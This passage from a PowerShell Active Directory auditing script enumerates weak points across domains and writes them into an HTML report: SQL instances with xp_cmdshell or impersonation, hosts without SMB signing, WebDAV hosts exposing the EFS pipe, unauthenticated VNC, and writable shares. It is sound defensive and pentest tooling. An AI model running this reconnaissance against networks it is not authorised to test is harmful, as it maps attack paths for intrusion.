		}
		
		$HTMLReversibleEncryptionTable = $ReversibleEncryptionTable | ConvertTo-Html -As List -Fragment
  		$HTMLReversibleEncryptionTable = $HTMLReversibleEncryptionTable.Replace("*", "Recommendations")
		$HTMLReversibleEncryptionTable = "<div class='report-section' style='display:none;'>$HTMLReversibleEncryptionTable</div>"
	}
	
	########################################################
    ########### Hosts running Unsupported OS ###############
	########################################################
	
    if($NoUnsupportedOS){}
    else{
        Write-Host ""
		Write-Host "Hosts running Unsupported OS" -ForegroundColor Cyan
		$TempUnsupportedHosts = foreach ($AllDomain in $AllDomains) {
			$UnsupportedHosts = $TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain} | Where-Object {
				($_.OperatingSystem -like "Windows Me*") -or
				($_.OperatingSystem -like "Windows NT*") -or
				($_.OperatingSystem -like "Windows 95*") -or
				($_.OperatingSystem -like "Windows 98*") -or
				($_.OperatingSystem -like "Windows XP*") -or
				($_.OperatingSystem -like "Windows 7*") -or
				($_.OperatingSystem -like "Windows Vista*") -or
				($_.OperatingSystem -like "Windows 2000*") -or
				($_.OperatingSystem -like "Windows 8*") -or
				($_.OperatingSystem -like "Windows Server 2012*") -or
				($_.OperatingSystem -like "Windows Server 2008*") -or
				($_.OperatingSystem -like "Windows Server 2003*") -or
				($_.OperatingSystem -like "Windows Server 2000*")
			}

			foreach ($UnsupportedHost in $UnsupportedHosts) {
				if($UnsupportedHost.DnsHostName){$IPAddress = (Resolve-DnsName -Name $UnsupportedHost.DnsHostName -Type A).IPAddress}
				if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
				[PSCustomObject]@{
					"Name" = $UnsupportedHost.samaccountname
					"Enabled" = if ($UnsupportedHost.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$UnsupportedHost.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $UnsupportedHost.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = $IPAddress
					"Operating System" = $UnsupportedHost.operatingsystem
					"Account SID" = GetSID-FromBytes -sidBytes $UnsupportedHost.objectsid
					Domain = $AllDomain
				}
				$IPAddress = $null
			}
		}

  		if ($TempUnsupportedHosts) {
			if(!$NoOutput){$TempUnsupportedHosts | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap}
			$HTMLUnsupportedHosts = $TempUnsupportedHosts | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='UnsupportedHosts'>Hosts running Unsupported OS</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='UnsupportedHosts'>" }

   			$UnsupportedOSTable = [PSCustomObject]@{
				"Risk Rating" = "Critical - Needs Immediate Attention"
				"Description" = "These systems no longer receive security updates and patches from the vendor. This increases the likelihood of successful attacks, and exposes the entire domain to potential security breaches."
				"Remediation" = "It is essential to prioritize isolating, migrating or upgrading these machines to supported and regularly updated operating systems to mitigate these risks."
			}
			
			$HTMLUnsupportedOSTable = $UnsupportedOSTable | ConvertTo-Html -As List -Fragment
   			$HTMLUnsupportedOSTable = $HTMLUnsupportedOSTable.Replace("Description", '<a href="https://www.ncsc.gov.uk/collection/device-security-guidance/managing-deployed-devices/keeping-devices-and-software-up-to-date" target="_blank">Description</a>')
			$HTMLUnsupportedOSTable = $HTMLUnsupportedOSTable.Replace("Remediation", '<a href="https://www.ncsc.gov.uk/collection/device-security-guidance/managing-deployed-devices/obsolete-products" target="_blank">Remediation</a>')
			
			$HTMLUnsupportedOSTable = "<div class='report-section' style='display:none;'>$HTMLUnsupportedOSTable</div>"
		}

    }
	
	##################################
    ##################################
    ##################################
	
	$ExtendedChecksBanner = "<h3>Extended Checks</h3>"
	Write-Host ""
	Write-Host "Extended Checks" -ForegroundColor Red
	Write-Host ""
	
	#############################################
    ############### File Servers ###############
	#############################################
	
	Write-Host ""
	Write-Host "File Servers" -ForegroundColor Cyan
	
    $TempFileServers = foreach($AllDomain in $AllDomains){
		#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
		
		$Results = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain -AND $_.homedirectory})
		$ProcessedFileServers = @{}
		foreach ($Result in $Results) {
			$HomeDirectory = $Result.homedirectory
			$FileServer = if ($HomeDirectory -match '\\\\([^\\]+)') { $Matches[1] }
			if ($ProcessedFileServers.ContainsKey($FileServer)) {continue}
			$ProcessedFileServers[$FileServer] = $true
			if($FileServer -like "*.*"){
				$RetrieveObjectServers = @($TotalEnabledDisabledMachines | Where-Object {$_.dnshostname -eq $FileServer})
			}
			else{$RetrieveObjectServers = @($TotalEnabledDisabledMachines | Where-Object {$_.samaccountname -eq "${FileServer}$"})}
			foreach($RetrieveObjectServer in $RetrieveObjectServers){
				$FileServerShort = $RetrieveObjectServer.name
				$FileServerDomain = $RetrieveObjectServer.domain
				if($RetrieveObjectServer.dnshostname){$IPAddress = (Resolve-DnsName -Name $RetrieveObjectServer.dnshostname -Type A).IPAddress}
				if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
				[PSCustomObject]@{
					Server = $RetrieveObjectServer.samaccountname
					"Enabled" = if ($RetrieveObjectServer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$RetrieveObjectServer.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $RetrieveObjectServer.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
					'IP Address' = $IPAddress
					"Operating System" = $RetrieveObjectServer.operatingsystem
					"Account SID" = GetSID-FromBytes -sidBytes $RetrieveObjectServer.objectsid
					Domain = $FileServerDomain
				}
				$IPAddress = $null
			}
		}
	}

    if($TempFileServers){
		if(!$NoOutput){$TempFileServers | Sort-Object -Unique Domain,Server | Format-Table -AutoSize -Wrap}
		$HTMLFileServers = $TempFileServers | Sort-Object -Unique Domain,Server | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='FileServers'>File Servers</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='FileServers'>" }
	}
	
	#############################################
	############### SQL Instances #################
	#############################################

	Write-Host ""
	Write-Host "SQL Instances" -ForegroundColor Cyan
	
	$ProcessedSPNs = @{}
	$TempSQLServers = @()

	$TempSQLServers = foreach($AllDomain in $AllDomains) {
		#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
		$Results = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain -AND $_.servicePrincipalName -like "*SQL*"})
		$ExtractedSQLMachines = @()
		foreach ($Result in $Results) {
			foreach ($SPN in $Result.servicePrincipalName) {
				if ($ProcessedSPNs.ContainsKey($SPN)) {continue}
				$ProcessedSPNs[$SPN] = $true
				$SPNParts = $SPN -split '/'
				$ServerName = $SPNParts[1].Split(':')[0]
				$ServerShort = $ServerName.Split('.')[0]
				$DomainParts = $ServerName.Split('.') | Select-Object -Skip 1
				$ServerDomain = $DomainParts -join '.'
				if($ServerName -contains "."){$ObjectRetrieve = @($TotalEnabledDisabledMachines | Where-Object {$_.dnshostname -eq $ServerName})}
				else{$ObjectRetrieve = @($TotalEnabledDisabledMachines | Where-Object {$_.samaccountname -eq "${ServerShort}$"})}
				$ExtractedSQLMachines += $ObjectRetrieve
			}
		}
		
		$NameExtractedSQLMachines = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain -and (($_.samaccountname -like "*SQL*" -and $_.operatingsystem) -OR ($_.servicePrincipalName -like "*SQL*"))})
		#$NameExtractedSQLMachines = @($TotalEnabledDisabledMachines | Where-Object {$_.domain -eq $AllDomain -and $_.samaccountname -like "*SQL*" -and $_.objectcategory -like "*CN=Computer*"})
		
		$FinalExtractedSQLMachines = @($ExtractedSQLMachines + $NameExtractedSQLMachines)
		
		$FinalExtractedSQLMachines = $FinalExtractedSQLMachines | Sort-Object -Unique Domain,dnshostname
		
		foreach($Machine in $FinalExtractedSQLMachines){
			if($Machine.dnshostname){$IPAddress = (Resolve-DnsName -Name $Machine.dnshostname -Type A).IPAddress}
			if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
			$MSSQLAccessInfo = $null
			$MSSQLAccessInfo = SQL-Query -Server $Machine.dnshostname
			[PSCustomObject]@{
				Server = $Machine.samaccountname
				'IP Address' = $IPAddress
				"Access" = $MSSQLAccessInfo.Access
				"Mapping" = $MSSQLAccessInfo."Mapped to"
				"Roles" = $MSSQLAccessInfo.Roles
				"Impersonate" = $MSSQLAccessInfo.Impersonate
				"Service Account" = $MSSQLAccessInfo."Service Account"
				"xp_cmd" = $MSSQLAccessInfo."xp_cmdshell"
				"OLE" = $MSSQLAccessInfo."OLE Automation"
				"CLR" = $MSSQLAccessInfo."CLR Enabled"
				"RPC Out" = $MSSQLAccessInfo."RPC Out"
				"Links" = $MSSQLAccessInfo.Links
				Domain = $ServerDomain
			}
			$IPAddress = $null
		}
	}

	if($TempSQLServers) {
		if(!$NoOutput){$TempSQLServers | Sort-Object -Unique Domain,Server | Format-Table -AutoSize -Wrap}
		$HTMLSQLServers = $TempSQLServers | Sort-Object -Unique Domain,Server | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='SQLInstances'>SQL Instances</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='SQLInstances'>" }
	}
	
	#############################################
    ############### SCCM Servers ################
    #############################################
    
    Write-Host ""
    Write-Host "SCCM Servers" -ForegroundColor Cyan
    
    $TempSCCMServers = foreach($AllDomain in $AllDomains){
		#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
		<# $DomainEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$AllDomain")
		$SearcherArguments = @{
			LDAPFilter = '(objectClass=mSSMSManagementPoint)'
			Properties = 'dNSHostName'
		}
		$Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainEntry)
		$Searcher.Filter = $SearcherArguments.LDAPFilter
		$Searcher.PropertiesToLoad.Add($SearcherArguments.Properties) | Out-Null
		$Results = $Searcher.FindAll() #>
		$Results = @($CollectSCCMServers | Where-Object {$_.domain -eq $AllDomain -AND $_.mssmsmpname -like "*.*"})
		$ProcessedSCCMServers = @{}
		foreach ($Result in $Results) {
			$dNSHostName = $Result.mssmsmpname
			if ($ProcessedSCCMServers.ContainsKey($dNSHostName)) {continue}
			$SCCMServerShort = $dNSHostName.Split('.')[0]
			$DomainParts = $dNSHostName.Split('.') | Select-Object -Skip 1
			$SCCMServerDomain = $DomainParts -join '.'
			if($dNSHostName){$IPAddress = (Resolve-DnsName -Name $dNSHostName -Type A).IPAddress}
			if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
			#$ObjectRetrieve = $TotalAllMachines | Where-Object {$_.domain -eq $AllDomain} | Where-Object {$_.name -eq $SCCMServerShort}
			$Enrolled = (Get-WmiObject -Class SMS_Authority -Namespace root\CCM).CurrentManagementPoint -contains $dNSHostName
			$ObjectRetrieve = $TotalEnabledDisabledMachines | Where-Object {$_.domain -eq $AllDomain -AND $_.dnshostname -eq $dNSHostName}
			$ProcessedSCCMServers[$dNSHostName] = $true
			[PSCustomObject]@{
				Server = $ObjectRetrieve.samaccountname
				"Enabled" = if ($ObjectRetrieve.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$ObjectRetrieve.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $ObjectRetrieve.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				Enrolled = $Enrolled
				'IP Address' = $IPAddress
				"Operating System" = $ObjectRetrieve.operatingsystem
				"Account SID" = GetSID-FromBytes -sidBytes $ObjectRetrieve.objectsid
				Domain = $SCCMServerDomain
			}
			$IPAddress = $null
		}
	}
    
    if($TempSCCMServers){
        if(!$NoOutput){$TempSCCMServers | Sort-Object -Unique Domain,Server | Format-Table -AutoSize -Wrap}
        $HTMLSCCMServers = $TempSCCMServers | Sort-Object -Unique Domain,Server | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='SCCMServers'>SCCM Servers</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='SCCMServers'>" }
    }
	
	####################################################
    ######### WSUS Servers ###############
	####################################################
	
	Write-Host ""
    Write-Host "WSUS Servers" -ForegroundColor Cyan
	
	$TempWSUSServers = @()
	$WSUSServers = @()
	$TempWSUSServers += foreach ($AllDomain in $AllDomains) {
		
		$sysvolPath = "\\$AllDomain\SYSVOL\$AllDomain\Policies"
		
		$registryPolFiles = Get-ChildItem -Path $sysvolPath -Filter Registry.pol -Recurse
		
		foreach ($file in $registryPolFiles) {
			# Read the content of the Registry.pol file as a single string
			$content = Get-Content -Path $file.FullName -Encoding Unicode -Raw

			$pattern = "(http:\/\/|https:\/\/)[^\]]+:(8530|8531)"

			# Perform the regex match to find the pattern
			if ($content -match $pattern) {
				# Output the directory where the setting was found and the WSUS server URL
				
				$WSUSServers += $matches[0]
			}
		}
		
		foreach($WSUSServer in $WSUSServers){
				
			$wprotocol, $wrest = $WSUSServer -split "://"
			$wserver, $wport = $wrest -split ":", 2
			if($wserver -like "*.*"){$RetrievedWSUSServer = @($TotalEnabledDisabledMachines | Where-Object {$_.dnshostname -eq $wserver})}
			else{$RetrievedWSUSServer = @($TotalEnabledDisabledMachines | Where-Object {$_.name -eq $wserver})}
			
			if($RetrievedWSUSServer){
				if($RetrievedWSUSServer.dnshostname){$IPAddress = (Resolve-DnsName -Name $RetrievedWSUSServer.dnshostname -Type A).IPAddress}
				if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
				
				[PSCustomObject]@{
					Server = $RetrievedWSUSServer.samaccountname
					"Enabled" = if ($RetrievedWSUSServer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Protocol" = $wprotocol
					"Port" = $wport -replace '\D'
					'IP Address' = $IPAddress
					"Operating System" = $RetrievedWSUSServer.operatingsystem
					"Account SID" = GetSID-FromBytes -sidBytes $RetrievedWSUSServer.objectsid
					Domain = $RetrievedWSUSServer.domain
				}
			}
			else{
				$RetrievedWSUSServer = $wserver
				if($RetrievedWSUSServer){$IPAddress = (Resolve-DnsName -Name $RetrievedWSUSServer -Type A).IPAddress}
				if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
				
				[PSCustomObject]@{
					Server = $RetrievedWSUSServer
					"Enabled" = ""
					"Protocol" = $wprotocol
					"Port" = $wport -replace '\D'
					'IP Address' = $IPAddress
					"Operating System" = ""
					"Account SID" = ""
					Domain = ""
				}
			}
		}
	}
	
	$RegKey = "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate"
    $RegValue = "WUServer"
    $WSUSServers = @((Get-ItemProperty -Path "Registry::$($RegKey)" -Name $RegValue -ErrorAction SilentlyContinue).$RegValue)
	
	if($WSUSServers){
		$TempWSUSServers += foreach($WSUSServer in $WSUSServers){
			
			$wprotocol, $wrest = $WSUSServer -split "://"
			$wserver, $wport = $wrest -split ":", 2
			
			if($wserver -like "*.*"){$RetrievedWSUSServer = @($TotalEnabledDisabledMachines | Where-Object {$_.dnshostname -eq $wserver})}
			else{$RetrievedWSUSServer = @($TotalEnabledDisabledMachines | Where-Object {$_.name -eq $wserver})}
			if($RetrievedWSUSServer.dnshostname){$IPAddress = (Resolve-DnsName -Name $RetrievedWSUSServer.dnshostname -Type A).IPAddress}
			if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
			[PSCustomObject]@{
				Server = $RetrievedWSUSServer.samaccountname
				"Enabled" = if ($RetrievedWSUSServer.useraccountcontrol -band 2) { "False" } else { "True" }
				"Protocol" = $wprotocol
				"Port" = $wport -replace '\D'
				'IP Address' = $IPAddress
				"Operating System" = $RetrievedWSUSServer.operatingsystem
				"Account SID" = GetSID-FromBytes -sidBytes $RetrievedWSUSServer.objectsid
				Domain = $RetrievedWSUSServer.domain
			}
		}
	}
	
	if($TempWSUSServers){
        if(!$NoOutput){$TempWSUSServers | Sort-Object -Unique Domain,Server | Format-Table -AutoSize -Wrap}
        $HTMLWSUSServers = $TempWSUSServers | Sort-Object -Unique Domain,Server | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='WSUSServers'>WSUS Servers</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='WSUSServers'>" }
    }
	
	####################################################
    ######### Check Alive Hosts ###############
	####################################################
	if(-NOT ($NoSMBSigningEnum -AND $NoWebDAVEnum)){
		$AllAliveTargets = @()
		$AllAliveTargets = CheckAliveHosts -Targets $TotalEnabledMachines
  	}
	
	####################################################
    ######### SMB Signing Disabled ###############
	####################################################
	if(!$NoSMBSigningEnum){
	    Write-Host ""
	    Write-Host "SMB Signing Not Required" -ForegroundColor Cyan
		
		$SMBSigningDisabled = foreach($AllDomain in $AllDomains){
			#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
			$SMBSigningTargets = @(CheckSMBSigning -Targets ($AllAliveTargets | Where-Object {$_.domain -eq $AllDomain}))
			
			if($SMBSigningTargets){
				foreach($Target in $SMBSigningTargets){
					if($Target.dnshostname){$IPAddress = (Resolve-DnsName -Name $Target.dnshostname -Type A).IPAddress}
					if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
					[PSCustomObject]@{
						Machine = $Target.samaccountname
						"Enabled" = if ($Target.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if(!$Target.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $ObjectRetrieve.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
						'IP Address' = $IPAddress
						"Account SID" = GetSID-FromBytes -sidBytes $Target.objectsid
						"Operating System" = $Target.operatingsystem
						Domain = $AllDomain
					}
				}
			}
		}
		
		if($SMBSigningDisabled){
	        if(!$NoOutput){$SMBSigningDisabled | Sort-Object -Unique Domain,Machine | Format-Table -AutoSize -Wrap}
	        $HTMLSMBSigningDisabled = $SMBSigningDisabled | Sort-Object -Unique Domain,Machine | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='SMBSigningNotRequired'>SMB Signing Not Required</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='SMBSigningNotRequired'>" }
	    }
    }
	
	####################################################
    ######### WebDAV Enabled ###############
	####################################################
	if(!$NoWebDAVEnum){

$efssource = @"
using System;
using System.Runtime.InteropServices;

namespace DynamicTypes {
    public class PipeChecker {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WaitNamedPipeA(string lpNamedPipeName, uint nTimeOut);
    }
}
"@

Add-Type -TypeDefinition $efssource -Language CSharp

		function CheckEFSPipe {
		    param (
			[Parameter(Mandatory = $true)]
			[string]$TargetHost
		    )
		
		    $pipename = "\\$TargetHost\pipe\efsrpc"
		    $efsActive = [DynamicTypes.PipeChecker]::WaitNamedPipeA($pipename, 100)
		
		    if ($efsActive) {
			return "Running"
		    }
			else {
			Return "Stopped"
		    }
		}
		Write-Host ""
		Write-Host "WebDAV Enabled Machines" -ForegroundColor Cyan
		
		$WebDAVStatusResults = foreach($AllDomain in $AllDomains){
			#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
			$WebDAVStatusTargets = @(CheckWebDAVStatus -Targets ($AllAliveTargets | Where-Object {$_.domain -eq $AllDomain}))
			
			if($WebDAVStatusTargets){
				foreach($Target in $WebDAVStatusTargets){
					if($Target.dnshostname){$IPAddress = (Resolve-DnsName -Name $Target.dnshostname -Type A).IPAddress}
					if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
     					$EFSStatus = CheckEFSPipe -TargetHost $Target.dnshostname
					[PSCustomObject]@{
						Machine = $Target.samaccountname
						"Enabled" = if ($Target.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if(!$Target.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $ObjectRetrieve.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
						'IP Address' = $IPAddress
						"Account SID" = GetSID-FromBytes -sidBytes $Target.objectsid
      						"EFS Service" = $EFSStatus
						"Operating System" = $Target.operatingsystem
						Domain = $AllDomain
					}
				}
			}
		}
		
		if($WebDAVStatusResults){
	        if(!$NoOutput){$WebDAVStatusResults | Sort-Object -Unique Domain,Machine | Format-Table -AutoSize -Wrap}
	        $HTMLWebDAVStatusResults = $WebDAVStatusResults | Sort-Object -Unique Domain,Machine | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='WebDavEnabled'>WebDAV Enabled Machines</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='WebDavEnabled'>" }
	    }
    }
	
	####################################################
    ######### VNC Unauthenticated Access ###############
	####################################################
	if(!$NoVNCUnauthAccess){
	    Write-Host ""
	    Write-Host "VNC Unauthenticated Access" -ForegroundColor Cyan
		
		$VNCUnauthAccess = foreach($AllDomain in $AllDomains){
			#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
			$VNCUnauthAccessTargets = @(VNCUnauthAccess -Targets ($AllAliveTargets | Where-Object {$_.domain -eq $AllDomain}))
			
			if($VNCUnauthAccessTargets){
				foreach($Target in $VNCUnauthAccessTargets){
					if($Target.dnshostname){$IPAddress = (Resolve-DnsName -Name $Target.dnshostname -Type A).IPAddress}
					if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
					[PSCustomObject]@{
						Machine = $Target.samaccountname
						"Enabled" = if ($Target.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if(!$Target.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $ObjectRetrieve.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
						'IP Address' = $IPAddress
						"Account SID" = GetSID-FromBytes -sidBytes $Target.objectsid
						"Operating System" = $Target.operatingsystem
						Domain = $AllDomain
					}
				}
			}
		}
		
		if($VNCUnauthAccess){
	        if(!$NoOutput){$VNCUnauthAccess | Sort-Object -Unique Domain,Machine | Format-Table -AutoSize -Wrap}
	        $HTMLVNCUnauthAccess = $VNCUnauthAccess | Sort-Object -Unique Domain,Machine | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='VNCUnauthAccess'>VNC Unauthenticated Access</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='VNCUnauthAccess'>" }
	    }
    }
	
	####################################################
    ######### Printers ###############
	####################################################
	
	Write-Host ""
	Write-Host "Printers" -ForegroundColor Cyan
	
	$TempPrinters = foreach ($AllDomain in $AllDomains) {
		
		$TotPrinters = @($PrintersCollection | Where-Object {$_.domain -eq $AllDomain})
		
		foreach($printer in $TotPrinters){
			if($printer.servername){$IPAddress = (Resolve-DnsName -Name $printer.servername -Type A).IPAddress}
			if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
			[PSCustomObject]@{
				Name = $printer.shortservername
				"IP" = $IPAddress
				"Share Name" = $printer.printsharename
				"Port Name" = $printer.portname
				Driver = $printer.drivername
				URL = $printer.url
				Domain = $printer.domain
			}
		}
	}
	
	if($TempPrinters){
        if(!$NoOutput){$TempPrinters | Sort-Object -Unique Domain,Name,"Share Name",URL | Format-Table -AutoSize -Wrap}
        $HTMLPrinters = $TempPrinters | Sort-Object -Unique Domain,Name,"Share Name",URL | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='Printers'>Printers</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='Printers'>" }
    }
	
	############################################
    ########### Duplicate SPNs ###############
	############################################
	
	Write-Host ""
	Write-Host "Duplicate SPNs" -ForegroundColor Cyan
	$Excluded = 'kadmin/changepw'
	$TempSPNAccounts = @()
	
	foreach ($AllDomain in $AllDomains) {
		$SPNCache = [ordered] @{}
		$SPNAccounts = @($SumGroupsUsers | Where-Object {$_.domain -eq $AllDomain -AND $_.serviceprincipalname -AND $_.samaccountname -ne "krbtgt"})
		#$SPNAccounts = $SPNAccounts | Sort-Object -Unique samaccountname
		foreach ($Account in $SPNAccounts) {
			foreach ($SPN in $Account.ServicePrincipalName) {
                if (-not $SPNCache[$SPN]) {
                    $SPNCache[$SPN] = [PSCustomObject] @{
                        Name      = $SPN
                        Duplicate = $false
                        Count     = 0
                        Excluded  = $false
                        List   = [System.Collections.Generic.List[Object]]::new()
						Domain    = $AllDomain
                    }
                }
                if ($SPN -in $Excluded) {
                    $SPNCache[$SPN].Excluded = $true
                }
				$SPNCache[$SPN].List.Add($Account)
                $SPNCache[$SPN].Count++
            }
		}
		
		foreach ($SPN in $SPNCache.Values) {
			if ($SPN.Count -gt 1 -and $SPN.Excluded -ne $true) {
				$SPN.Duplicate = $true
			}
			if ($SPN.Duplicate) {
				
				$FinalAccounts = $SPN.List | ForEach-Object { $_.samaccountname }
				
				$TempSPNAccounts += [PSCustomObject] @{
					Domain    = $SPN.Domain
					"Duplicate SPN" = $SPN.Name
					Count     = $SPN.Count
					"Affected Accounts"  = $FinalAccounts -join ", "
				}
			}
			
		}
	}

 	if ($TempSPNAccounts) {
		if(!$NoOutput){$TempSPNAccounts | Sort-Object Domain,"Duplicate SPN" | Format-Table -AutoSize -Wrap}
		$HTMLSPNAccounts = $TempSPNAccounts | Sort-Object Domain,"Duplicate SPN" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DuplicateSPNs'>Duplicate SPNs</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DuplicateSPNs'>" }
	}

	####################################################
    ######### Readable Writable Shares ###############
	####################################################
	if(!$NoSMBSharesEnum){
		Write-Host ""
		Write-Host "Readable and Writable Shares" -ForegroundColor Cyan
	
	 	$excludedShares = @('SYSVOL', 'Netlogon', 'print$', 'IPC$')
		
		$SharesResultsTable = foreach ($AllDomain in $AllDomains) {
			
			$AllCompMachines = $TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain -AND $_.dnshostname} | Select-Object -ExpandProperty dnshostname
	
			$HostFQDN = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
			$AllCompMachines = $AllCompMachines | Where-Object {$_ -ne "$HostFQDN"}
		
			$SharesResults = Invoke-ShareHunter -Computers $AllCompMachines -Domain $AllDomain
			
			foreach ($obj in $SharesResults) {
				$shareName = ($obj."Share Name" -split '\\')[-1]
				if (-not ($shareName -in $excludedShares -and $obj.Writable -ne "YES")) {
					if($obj.Readable -eq "YES"){
						[PSCustomObject]@{
							'Targets'  = $obj.Targets
							'Share Name'    = $obj."Share Name"
							'Readable' = $obj.Readable
							'Writable' = $obj.Writable
							'Domain'   = $obj.Domain
						}
					}
					}
			}
		}
		
		if ($SharesResultsTable) {
			if(!$NoOutput){$SharesResultsTable | Sort-Object -Unique "Domain","Writable","Targets","Share Name" | Format-Table -AutoSize -Wrap}
			$HTMLSharesResultsTable = $SharesResultsTable | Sort-Object -Unique "Domain","Writable","Targets","Share Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='RWShares'>Readable and Writable Shares</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='RWShares'>" }
			$HTMLSharesResultsTable = $HTMLSharesResultsTable -replace "(\\)(C\$)", '$1<span class="YesStatus">$2</span>'
			$HTMLSharesResultsTable = $HTMLSharesResultsTable -replace "(\\)(ADMIN\$)", '$1<span class="YesStatus">$2</span>'
		}
  	}

   	#############################################
    ############### Home Directories ###############
	#############################################
	
	Write-Host ""
	Write-Host "Home Directories" -ForegroundColor Cyan
	
    $TempHomeDirectories = foreach($AllDomain in $AllDomains){
		$HomeDirectoriesResults = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain -AND $_.homedirectory})
		foreach ($Result in $HomeDirectoriesResults) {
			$HomeDirectory = $Result.homedirectory
			[PSCustomObject]@{
				"User Name" = $Result.samaccountname
				"Home Directory" = $Result.homedirectory
				Domain = $Result.domain
			}
		}
	}

    if($TempHomeDirectories){
		if(!$NoOutput){$TempHomeDirectories | Sort-Object -Unique Domain,"User Name","Home Directory" | Format-Table -AutoSize -Wrap}
		$HTMLHomeDirectories = $TempHomeDirectories | Sort-Object -Unique Domain,"User Name","Home Directory" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='HomeDirectories'>Home Directories</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='HomeDirectories'>" }
	}
	
	##################################################
    ########### Empty Groups ################
	##################################################
	if($EmptyGroups -OR $AllEnum){
		Write-Host ""
		Write-Host "Empty Groups" -ForegroundColor Cyan
		
		$EmptyGroupsResults = foreach ($AllDomain in $AllDomains) {
			$EmptyGroups = @($TotalGroups | Where-Object {$_.domain -eq $AllDomain -AND -not $_.member -and ((GetSID-FromBytes -sidBytes $_.objectsid) -match "S-1-(\d+-){4,}[\d]{4,10}$")})
			
			if($EmptyGroups){
				foreach($EmptyGroup in $EmptyGroups){
					[PSCustomObject]@{
						"Group Name" = $EmptyGroup.SamAccountName
						"Group SID" = GetSID-FromBytes -sidBytes $EmptyGroup.objectsid
						"Domain" = $AllDomain
					}
				}
			}
		}
		
		if ($EmptyGroupsResults | Where-Object {$_."Group Name"}) {
